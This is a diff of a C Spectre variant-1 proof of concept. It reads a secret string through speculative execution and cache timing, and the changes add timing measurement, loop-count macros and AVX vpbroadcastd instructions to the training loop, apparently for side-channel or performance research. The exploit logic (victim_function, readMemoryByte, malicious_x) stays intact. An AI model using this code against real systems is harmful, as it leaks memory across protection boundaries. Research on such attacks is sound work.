@@ -1,5 +1,3 @@
-
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -10,6 +8,7 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 #include <unistd.h>
+#include <time.h>
 /********************************************************************
 Victim code.
 ********************************************************************/
@@ -22,7 +21,35 @@ uint8_t array2[256 * 512];
 char * secret = "This code uses the Spectre vulnerability to access kernel memory";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
+#define STR(x) #x
+#define XSTR(s) STR(s)
 
+// _____________________________________________________________
+
+// TODO: Modify these values to match desired behavior.
+
+// Number of loops for 'loop1'
+/* Try keeping this value high enough, so the signature is noticeable
+and you can collect good data but not so high the it takes more than
+like 3 seconds to execute. */
+#define LOOPS 375000
+
+// Number of times instructions are repeated
+/* We want this value to be large so the number of instructions that
+we want to test is significantly more than the instructions needed
+to maintain the loop and register values. Although it cannot be too large
+or it will take a long time to compile, and the out file will be very
+large. */
+#define REPEAT 300
+
+/* The next two values are used to calculate the number of
+instructions that are executed. */
+
+// Number of repeated instructions
+#define NUM_REPEAT 0
+
+//Number of pre repeated instruction
+#define NUM_PRE_REPEAT 0
 void victim_function(size_t x) {
   if (x < array1_size) {
     
@@ -62,19 +89,16 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
-      float a = 1.11, b = 4.77;
-      int i;
-      for (i = 0; i < 200; i++) {
-        __asm__ (
-        "fld %1;"
-        "fld %2;"
-        "fadd;"
-        "fstp %0;"
-        : "=m" (a)
-        : "m" (a), "m" (b)
+      for (i = 0; i < 2500; i++){
+        __asm__(
+          "vpbroadcastd %xmm0,%ymm0\n\t"
+          "vpbroadcastd %xmm1,%ymm1\n\t"
+          "vpbroadcastd %xmm2,%ymm2\n\t"
+          "vpbroadcastd %xmm0,%ymm0\n\t"
+          "vpbroadcastd %xmm1,%ymm1\n\t"
+          "vpbroadcastd %xmm2,%ymm2\n\t"
         );
-       }
-
+      }
       victim_function(x);
 
     }
@@ -115,7 +139,10 @@ int main(int argc,
   size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
   int i, score[2], len = 40;
   uint8_t value[2];
+  clock_t start, end;
+  double elapsed_time_ms;
 
+  start = clock();
   for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   if (argc == 3) {
@@ -135,5 +162,13 @@ int main(int argc,
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
   }
+  end = clock();    
+  elapsed_time_ms = (double)(end - start) * 1000 / CLOCKS_PER_SEC;
+  unsigned long total_inst = (LOOPS*NUM_PRE_REPEAT)+((unsigned long)LOOPS*REPEAT*NUM_REPEAT);
+  double total_inst_mil = total_inst / 1000000;
+  printf("%lf %lf\n", total_inst_mil, elapsed_time_ms); 
+
+    
+    return (0);
   return (0);
 }
